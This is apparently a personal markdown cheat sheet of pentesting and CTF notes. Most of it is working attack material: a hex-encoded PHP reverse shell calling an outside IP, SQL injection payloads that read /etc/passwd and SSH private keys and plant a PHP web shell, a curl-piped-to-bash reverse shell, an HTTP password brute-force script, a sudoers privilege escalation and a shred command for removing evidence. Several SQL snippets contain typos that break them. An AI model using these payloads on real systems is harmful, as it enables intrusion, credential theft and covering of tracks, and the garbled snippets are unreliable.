# hacking-notes


## Conversion

In a SQL Injecto to space satinization you can convert PHP code into Hexadecimal

```bash
echo '<?php system("bash -i >& /dev/tcp/10.9.4.202/4443 0>&1") ?>' | xxd -p -u | tr -d '\n'
```

How to convert from hexadecimal to ASCII using xxd command:

echo "your hexadecimal code here" | xxd -ps -r; echo

## Kali Linux

Change Kali Linux keyboard language to Spanish

```bash
setxkbmap es sundeadkeys
```

## Rootkits

How to monitor for linux rootkits

1. Make rkhunter database
```bash
rkhunter --propupd 
```

2. Launch rkhunter
```bash 
rkhunter --enable all
```

## SQL Injection

How to guess number of columns of a table
```sql
whatever' order by <nº> -- -
``` 

If you knwo the number of columns you can make a selection to test your sql injection
```sql
whatever' union select 1,"test" -- -
```

Load a file in a SQLinjection
```sql
whatever ' union select 1,load_file("/etc/password")-- -

whatever ' union select 1,load_file("/home/user/.ssh/id_rsa")-- -

whatever ' union select 1,load_file("/home/user/.ssh/id_rsa.pub")-- -

whatever ' union select 1,load_file("/etc/group")-- -
```

How to know what database exists in a Sql Injection, p.e. with 2 databases
```
whatever ' union select 1,shcema_name from information_scheam.schemadata limit 1,1 -- -

whatever ' union select 1,shcema_name from information_scheam.schemadata limit 2,1 -- -
```

How to list the tables of a database p.g. for the database webapp
```sql
whatever' union select 1,tabla_name from information_sceham.tables where table_schema="webapp" limit 1,1 -- -
```

How to get information of a table from the database name:
```sql
whatever' union select 1, column:name from information_scheam.columns where table_schema="webapp" and table_name="queue" limit 1,1
```

How to get information of columns of a table from the table name:
```sql
whatever' union select 1, group-concat(userID,0x3a,queueNum) from queue -- -
```

How to write into a file with a SQL Injection
```sql
whatever' union select 1,"I was here" INTO OUTFILE "/var/www/html/test.php"-- -
```

How to inject PHP code, in this case remote command execution into an sqlinjection with satinatization:

1. covert a string into hexadecimal and inject the code on the wesite
```bash
echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]). "</pre>"; ?>' | xxd -ps | tr -d "\n"
```
2. Create a reverse shell, reverseh.sh
```bash
#!/bin/bash

bash -i >& /dev/tcp/<your-local-ip>/4443 0>&1
```

3. Share a server with simpleHttpServer
```bash
python -m SimpleHTTPServer 80
```

4. Listen with netcat on your machine to the port 4443
```bash
nc -lvp 4443
```

4. Curl your reverse.sh into your remote execution injection (point 1) and pipe to bash
```bash 
http://<remote-ip>/remote.php?cmd=curl <your-local-ip>/reverse.sh | bash 
```


## System Commands

Get users that login into the system

```bash
last
```

Launch a pseudo-control
1. In the remote shell
```bash
script /dev/null -c bash

(and press Control + Z)
```

2. In your shell:
```bash
stty raw -echo

nc -nlvp 443

# <press fg>

reset

# Consolidate your terminal
xterm

# To be able to make Control + C and Control + L
export TERM=xterm
export SHELL=bash

# Get correct proporcion
stty rows 52 columns 197
```

# Remove Evidences
```
shred -zun -S -v{file.php, file2.xt}
```

# Grep users that exist at system lvel
```bash
cat /etc/passwd | grep "sh$"
```

# How to forwared a remote port to your local machine using ssh and dont login in your system
Execute the following in the remote machine.
```ssh
ssh -R 3000:127.0.0.1:3000 <your-user>@<your-ip> -N -f
```

# PENETRATION TESTING STEPS
1 . Make a ping and try to detect the OS of the machine
```ssh
ping -c 10 <ip>
```

2. Scan for open ports
```ssh
nmap -p- --open -T5 -v -n <remote-ip>
```

3. Detect services running on open ports
```
nmap -sC -sV -p <ports separated by commas>
```

4. In case of a web server try wfuzz:
```bash
wfuzz -c --hc=404 -w <dictionary> http://<remote-ip>/FUZZ1
```

5. Run a dictionary agains the web:
```
wfuzz -w dictionary.txt http://<remote-ip>
```

6. A script to make a brute force to a website asking credentials with a prompt
```bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n[!] Exiting..\n"
  tput cnorm; exit 1;
  exit 1
}

trap ctrl_c INT

# Hide a cursor
tput civis

for password in $(cat diccionario.txt); do
  curl -s -X GET http://<ip>/inferno --user admin:$password | html2text| grep "Unauthorized" &>/dev/null
  
  if [ "$(echo $?)" -ne "0" ]; then
    echo -e "\n[*] THe password of user admin is $password\n"
    exit 0
  fi
done; tput cnorm;

```
7. How to authenticate using curl on a website with user/password promt:
```
curl -X GET -s http://<ip>/admin --user user:password
```

# Testing estenografia 
```
steghide info <picture.jpg>
```
# Add a user to sudoers to scale privileges thanks of having "tee" command with suid
```sudo
echo "<user> ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
```

